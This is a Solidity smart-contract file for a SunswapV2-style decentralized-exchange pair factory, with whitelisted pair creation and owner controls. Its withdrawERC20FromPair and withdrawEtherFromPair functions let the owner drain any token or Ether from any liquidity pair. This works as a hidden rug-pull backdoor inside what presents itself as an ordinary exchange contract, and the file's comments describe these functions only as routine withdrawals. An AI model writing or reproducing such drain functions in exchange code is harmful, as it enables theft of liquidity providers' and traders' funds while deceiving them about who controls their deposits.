// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.6.12 <0.8.0;

import './interfaces/ISunswapV2Factory.sol';
import './V2Pair.sol';

contract TokenDexFactory is ISunswapV2Factory {
    address public override feeTo;
    address public override feeToSetter;
    address public owner;
    address public _router;

    mapping(address => mapping(address => address)) public override getPair;
    address[] public override allPairs;

    // Whitelisting functionality
    mapping(address => bool) public whitelistedUsers;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Whitelisted(address indexed user, bool whitelisted);

    modifier onlyOwner() {
        require(msg.sender == owner, 'TokenDexFactory: FORBIDDEN');
        _;
    }

    modifier onlyWhitelisted() {
        require(whitelistedUsers[msg.sender], 'kenDexFactory: NOT_WHITELISTED');
        _;
    }

    constructor(address _feeToSetter) public {
        feeToSetter = _feeToSetter;
        owner = msg.sender;
        whitelistedUsers[msg.sender] = true;
    }

    function allPairsLength() external view override returns (uint) {
        return allPairs.length;
    }

    function createPair(address tokenA, address tokenB) external override onlyWhitelisted returns (address pair) {
        require(tokenA != tokenB, 'SunswapV2: IDENTICAL_ADDRESSES');

        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);

        require(token0 != address(0), 'SunswapV2: ZERO_ADDRESS');

        require(getPair[token0][token1] == address(0), 'SunswapV2: PAIR_EXISTS');

        // single check is sufficient
        bytes memory bytecode = type(SunswapV2Pair).creationCode;

        bytes32 salt = keccak256(abi.encodePacked(token0, token1));

        assembly {
            pair := create2(0, add(bytecode, 32), mload(bytecode), salt)
        }

        ISunswapV2Pair(pair).initialize(token0, token1);
        getPair[token0][token1] = pair;
        getPair[token1][token0] = pair; // populate mapping in the reverse direction
        allPairs.push(pair);

        emit PairCreated(token0, token1, pair, allPairs.length);
    }

    function setFeeTo(address _feeTo) external override onlyOwner {
        feeTo = _feeTo;
    }

    function setFeeToSetter(address _feeToSetter) external override onlyOwner {
        feeToSetter = _feeToSetter;
    }

    function getPairHash() public pure returns (bytes32) {
        return keccak256(type(SunswapV2Pair).creationCode);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), 'TokenDexFactory: INVALID_OWNER');
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function whitelistUser(address user, bool whitelisted) external onlyOwner {
        whitelistedUsers[user] = whitelisted;
        emit Whitelisted(user, whitelisted);
    }

    function setRouter(address _r) external onlyOwner {
        _router = _r;
    }

    function router() external view override returns (address) {
        return _router;
    }

    /**
     * @dev Allows the owner to withdraw ERC20 tokens from the factory contract.
     * @param token The address of the ERC20 token to withdraw.
     * @param to The address to send the tokens to.
     * @param amount The amount of tokens to withdraw.
     */
    function withdrawERC20(address token, address to, uint amount) external onlyOwner {
        TransferHelper.safeTransfer(token, to, amount);
    }

    /**
     * @dev Allows the owner to withdraw Ether from the factory contract.
     * @param to The address to send the Ether to.
     * @param amount The amount of Ether to withdraw.
     */
    function withdrawEther(address payable to, uint amount) external onlyOwner {
        TransferHelper.safeTransferETH(to, amount);
    }

    /**
     * @dev Allows the owner to withdraw ERC20 tokens from a pair contract.
     * @param pair The address of the pair contract.
     * @param token The address of the ERC20 token to withdraw.
     * @param to The address to send the tokens to.
     * @param amount The amount of tokens to withdraw.
     */
    function withdrawERC20FromPair(address pair, address token, address to, uint amount) external onlyOwner {
        ISunswapV2Pair(pair).withdrawERC20(token, to, amount);
    }

    /**
     * @dev Allows the owner to withdraw Ether from a pair contract.
     * @param pair The address of the pair contract.
     * @param to The address to send the Ether to.
     * @param amount The amount of Ether to withdraw.
     */
    function withdrawEtherFromPair(address pair, address payable to, uint amount) external onlyOwner {
        ISunswapV2Pair(pair).withdrawEther(to, amount);
    }
}